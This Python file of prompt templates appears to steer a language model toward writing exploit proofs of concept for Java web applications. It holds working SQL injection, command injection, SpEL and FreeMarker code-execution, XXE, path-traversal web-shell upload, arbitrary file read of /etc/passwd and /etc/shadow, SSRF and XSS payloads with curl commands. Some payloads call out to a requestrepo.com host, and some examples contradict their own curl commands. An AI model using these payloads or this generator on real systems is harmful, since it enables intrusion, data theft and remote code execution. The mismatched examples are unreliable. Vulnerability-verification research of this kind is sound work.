# prompts/poc_prompts_v4_concise.py

VULN_SPECIFIC_PROMPTS = {
    "sql_injection": {
        "instructions": """
**Instruction: SQL Injection**
- Objective: Bypass authentication or extract data.
- Key Technique: Error-based injection using `EXTRACTVALUE`.
- Must consider and attempt to bypass known filtering functions.
- **Very Important: Prioritize using error-based injection**
""",
        "few_shot_example": """
**Example: SQL Injection (Error-based)**
*Input*
- route_info: `{"api": "/users/login", "method": "POST", "vuln_parameter": "username", "vuln_type": "sql_injection"}`
- source_code: `... "SELECT * FROM users WHERE username = '" + username + "'" ...`
*Output (JSON)*
```json
{
  "poc_details": {
    "api": "/users/login",
    "method": "POST",
    "vuln_parameter_payload": { "username": "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e)) -- " },
    "normal_parameter_payload": { "password": "any" }
  },
  "curl_command": "curl -s -i -X POST 'http://localhost:8080/users/login' -d 'username=%27%20AND%20EXTRACTVALUE(1,%20CONCAT(0x7e,%20(SELECT%20@@version),%200x7e))%20--%20&password=any'"
}
```
"""
    },
    "command_injection": {
        "instructions": """
**Instruction: Command Injection**
- Objective: Execute arbitrary OS commands.
- Key Technique: Inject command separators (`;`, `|`, `&&`).
- Prioritize trying out-of-band data exfiltration (OAST).
""",
        "few_shot_example": """
**Example: Command Injection (In-band Execution)**
*Input*
- route_info: `{"api": "/api/v1/file/show", "method": "GET", "vuln_parameter": "filepath", "vuln_type": "command_injection"}`
- source_code: `... builder.command("sh", "-c", "cat " + filepath); ...`
*Output (JSON)*
```json
{
  "poc_details": {
    "api": "/api/v1/file/show",
    "method": "GET",
    "vuln_parameter_payload": { "filepath": "non_existent.txt; whoami" },
    "normal_parameter_payload": {}
  },
  "curl_command": "curl -s -i -X GET 'http://localhost:8080/api/v1/file/show?filepath=non_existent.txt%3B%20curl xxx.requestrepo.com'"
}
```
"""
    },
    "arbitrary_file_read": {
        "instructions": """
**Instruction: Arbitrary File Read**
- Objective: Read sensitive files through directory traversal (`../`).
- Key Technique: Use `../` sequences and curl's `--path-as-is` option.
- Prioritize reading system files like /etc/passwd or /etc/shadow
""",
        "few_shot_example": """
**Example: Arbitrary File Read**
*Input*
- route_info: `{"api": "/download", "method": "GET", "vuln_parameter": "filename", "vuln_type": "arbitrary_file_read"}`
- source_code: `... new File("/var/www/downloads/" + filename); ...`
*Output (JSON)*
```json
{
  "poc_details": {
    "api": "/download",
    "method": "GET",
    "vuln_parameter_payload": { "filename": "../../../../../etc/passwd" },
    "normal_parameter_payload": {}
  },
  "curl_command": "curl -s -i --path-as-is 'http://localhost:8080/download?filename=../../../../../etc/passwd'"
}
```
"""
    },
    "path-injection": {
        "instructions": """
**Instruction: Path Injection/File Upload**
- Objective: Upload a harmless Web Shell (e.g., a simple JSP file) to a web-accessible directory on the server through directory traversal (`../`).
- Key Technique: Construct filenames containing multiple `../` sequences to escape the current directory. Filenames should point to common web root directories, e.g., `../../../../var/www/html/poc.jsp`.
- **Strictly Prohibited**: Absolutely prohibited from attempting to overwrite any existing system files, such as `/etc/passwd`.
""",
        "few_shot_example": """
**Example: Path Injection (Upload Web Shell)**
*Input*
- route_info: `{"api": "/file/upload", "method": "POST", "vuln_parameter": "file", "vuln_type": "path-injection"}`
- source_code: `... new File("/tmp/" + multifile.getOriginalFilename()); ...`
*Output (JSON)*
```json
{
  "poc_details": {
    "api": "/file/upload",
    "method": "POST",
    "vuln_parameter_payload": { "file": { "filename": "../../../../../var/www/html/poc.jsp", "content": "<% out.println(\\"Path Injection PoC Successful\\"); %>" } },
    "normal_parameter_payload": {}
  },
  "curl_command": "echo '<% out.println(\\"Path Injection PoC Successful\\"); %>' > poc.jsp && curl -s -i -X POST 'http://localhost:8080/file/upload' -F 'file=@poc.jsp;filename=\"../../../../../var/www/html/poc.jsp\"' && rm poc.jsp"
}
```
"""
    },
    "xss": {
        "instructions": """
**Instruction: Cross-Site Scripting (XSS)**
- Objective: Inject and execute malicious JavaScript code in the response.
- Key Technique: Use `<script>` tags or HTML event handlers (such as `onerror`).
- Payload must be valid HTML/JavaScript and be URL encoded for transmission in requests.
""",
        "few_shot_example": """
**Example: Reflected XSS**
*Input*
- route_info: `{"api": "/greeting", "method": "GET", "vuln_parameter": "name", "parameter_location": "query", "vuln_type": "xss"}`
- source_code: `... return "Hello " + name; ...`
*Output (JSON)*
```json
{
  "poc_details": {
    "api": "/greeting",
    "method": "GET",
    "vuln_parameter_payload": { "name": "<script>alert('XSS')</script>" },
    "normal_parameter_payload": {}
  },
  "curl_command": "curl -s -i -X GET 'http://localhost:8080/greeting?name=%3Cscript%3Ealert(%27XSS%27)%3C/script%3E'"
}
```
"""
    },
    "spel-injection" : {
        "instructions" : """
**Instruction: SpEL Injection**
- Objective: Construct SpEL expressions to execute arbitrary code.
- **Core Rule**: If the code uses `TemplateParserContext`, the payload **must** be wrapped in `#{...}`.
""",
        "few_shot_example": """
**Example: SpEL Injection (with TemplateParserContext)**
*Input*
- route_info: `{"api": "/greeting", "method": "GET", "vuln_parameter": "name", "vuln_type": "spel-injection"}`
- source_code: `... parser.parseExpression("Hello " + name, new TemplateParserContext()); ...`
*Output (JSON)*
```json
{
  "poc_details": {
    "api": "/greeting",
    "method": "GET",
    "vuln_parameter_payload": { "name": "#{T(java.lang.Runtime).getRuntime().exec('curl xxx.requestrepo.com')}" },
    "normal_parameter_payload": {}
  },
  "curl_command": "curl -s -i 'http://localhost:8080/greeting?name=%23%7BT(java.lang.Runtime).getRuntime().exec(%27curl xxx.requestrepo.com%27)%7D'"
}
```
"""
    },
    "ssti": {
      "instructions":"""
**Instruction: Server-Side Template Injection (SSTI)**
- Objective: Inject specific template engine syntax to execute code.
- Key Technique: FreeMarker uses `<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("curl xxx.requestrepo.com") }`. Thymeleaf leverages `__${...}__::.x` syntax to trigger SpringEL.
""",
        "few_shot_example": """
**Example: FreeMarker SSTI**
*Input*
- route_info: `{"api": "/profile", "method": "GET", "vuln_parameter": "name", "vuln_type": "ssti"}`
- source_code: `... template.process(data, writer); ...`
*Output (JSON)*
```json
{
  "poc_details": {
    "api": "/profile",
    "method": "GET",
    "vuln_parameter_payload": { "name": "<#assign ex=\\"freemarker.template.utility.Execute\\"?new()> ${ ex(\\"curl xxx.requestrepo.com\\") }" },
    "normal_parameter_payload": {}
  },
  "curl_command": "curl -s -i 'http://localhost:8080/profile?name=%3C%23assign%20ex%3D%22freemarker.template.utility.Execute%22%3Fnew()%3E%20%24%7B%20ex(%22curl xxx.requestrepo.com%22)%20%7D'"
}
```
"""
    },
    "xxe": {
      "instructions": """
**Instruction: XML External Entity Injection (XXE)**
- Objective: Construct XML documents containing malicious XML external entities to read files or probe internal networks.
- Key Technique: Define an external entity with value `file:///...` in `<!DOCTYPE>` and reference it in the XML body.
""",
        "few_shot_example": """
**Example: XXE (File Read)**
*Input*
- route_info: `{"api": "/userinfo", "method": "POST", "vuln_parameter": "xml_body", "vuln_type": "xxe"}`
- source_code: `... DocumentBuilder db = dbf.newDocumentBuilder(); db.parse(request.getInputStream()); ...`
*Output (JSON)*
```json
{
  "poc_details": {
    "api": "/userinfo",
    "method": "POST",
    "vuln_parameter_payload": { "xml_body": "<?xml version=\\"1.0\\"?><!DOCTYPE user [<!ENTITY xxe SYSTEM \\"file:///etc/passwd\\">]><user><username>&xxe;</username></user>" },
    "normal_parameter_payload": {}
  },
  "curl_command": "curl -s -i -X POST 'http://localhost:8080/userinfo' -H 'Content-Type: application/xml' -d '<?xml version=\\"1.0\\"?><!DOCTYPE user [<!ENTITY xxe SYSTEM \\"file:///etc/passwd\\">]><user><username>&xxe;</username></user>'"
}
```
"""
    },
    "ssrf": {
      "instructions": """
**Instruction: Server-Side Request Forgery (SSRF)**
- Objective: Construct malicious requests that trick the server into making requests to unexpected internal or external addresses, enabling internal network probing, sensitive information retrieval, or internal service attacks.
- Key Technique: Provide a URL parameter pointing to an internal address (e.g., `http://127.0.0.1`) or use a `file://` protocol URL.
""",
        "few_shot_example": """
**Example: SSRF (Internal Network Probing)**
*Input*
- route_info: `{"api": "/fetch_image", "method": "GET", "vuln_parameter": "url", "vuln_type": "ssrf"}`
- source_code: `... String imageUrl = request.getParameter("url"); URL url = new URL(imageUrl); HttpURLConnection connection = (HttpURLConnection) url.openConnection(); ...`
*Output (JSON)*
```json
{
  "poc_details": {
    "api": "/fetch_image",
    "method": "GET",
    "vuln_parameter_payload": { "url": "" },
    "normal_parameter_payload": {}
  },
  "curl_command": "curl -s -i -X GET 'http://localhost:8080/fetch_image?url=xxxxx.requestrepo.com'"
}
"""
},
    "default": {
        "instructions": "**Vulnerability-Specific Instructions: None**\n- Please analyze based on general vulnerability knowledge, ",
        "few_shot_example": "" # No example provided by default
    }
}

def get_vuln_specific_prompt(vuln_type: str) -> str:
    """
    Get specific prompt content based on vulnerability type.
    """
    # Simplify matching, e.g., map "java/xss" to "xss"
    simple_vuln_type = vuln_type.split('/')[-1].lower()
    
    # Additional mapping rules can be added here
    if "spel_injection" in simple_vuln_type:
        simple_vuln_type = "spel-injection"
    if "xss" in simple_vuln_type:
        simple_vuln_type = "xss"

    prompt_data = VULN_SPECIFIC_PROMPTS.get(simple_vuln_type, VULN_SPECIFIC_PROMPTS["default"])
    return f"{prompt_data['instructions']}\n\n{prompt_data['few_shot_example']}"
